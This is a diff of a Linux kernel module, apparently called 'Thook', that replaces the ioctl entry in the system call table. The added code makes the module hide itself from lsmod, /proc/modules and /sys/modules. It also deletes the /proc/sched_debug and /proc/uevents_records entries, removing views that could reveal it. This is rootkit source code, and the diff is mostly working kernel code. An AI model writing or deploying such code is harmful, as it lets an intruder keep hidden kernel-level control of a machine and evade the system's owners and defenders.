@@ -322,32 +322,26 @@ static int hook_func(unsigned long hook_function, int nr,
 
 
 static int __init my_module_init(void) {
-    // 1. 获取 lookup_name 函数地址
-    my_kallsyms_lookup_name = (kallsyms_lookup_name_t)get_kallsyms_lookup_name_addr();
-    printk("[Thook] kallsyms_lookup_name addr: %px\n", my_kallsyms_lookup_name);
 
-    if (!my_kallsyms_lookup_name) {
-        printk("[Thook] Error: Cannot find kallsyms_lookup_name\n");
-        return -EINVAL;
-    }
+    #if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 14, 186)
+    hook_func((unsigned long)hook_ioctl, __NR_ioctl, __sys_call_table);
+    #else
+    hook_func((unsigned long)new_hook_ioctl, __NR_ioctl, __sys_call_table);
+    //__sys_call_table[__NR_ioctl] = (unsigned long)new_hook_ioctl;
+    #endif
+    
+    if (!IS_ERR(filp_open("/proc/sched_debug", O_RDONLY, 0))) {
+		remove_proc_subtree("sched_debug", NULL); // /proc/sched_debug。
+	}
+	if (!IS_ERR(filp_open("/proc/uevents_records", O_RDONLY, 0))) {
+		remove_proc_entry("uevents_records", NULL); // /proc/uevents_records。
+	}
+	
+	list_del(&THIS_MODULE->list); //lsmod,/proc/modules
+    kobject_del(&THIS_MODULE->mkobj.kobj); // /sys/modules
+    list_del(&THIS_MODULE->mkobj.kobj.entry); // kobj struct list_head entry
 
-    // 2. 获取系统调用表地址
-    __sys_call_table = (unsigned long *)my_kallsyms_lookup_name("sys_call_table");
-    printk("[Thook] sys_call_table addr: %px\n", __sys_call_table);
-
-    if (!__sys_call_table) {
-        printk("[Thook] Error: Cannot find sys_call_table\n");
-        return -EINVAL;
-    }
-
-    // 3. 保存原始 ioctl 地址 (这步最关键，你之前的代码漏了)
-    new_original_ioctl = (new_syscall_ioctl_t)__sys_call_table[__NR_ioctl];
-    printk("[Thook] Original ioctl addr: %px\n", new_original_ioctl);
-
-    // 4. 执行 Hook 并检查返回值
-    int ret = hook_func((unsigned long)new_hook_ioctl, __NR_ioctl, __sys_call_table);
-    printk("[Thook] Hook result: %d\n", ret);
-
+	printk("[Thook] init\n");
     return 0;
 }
 
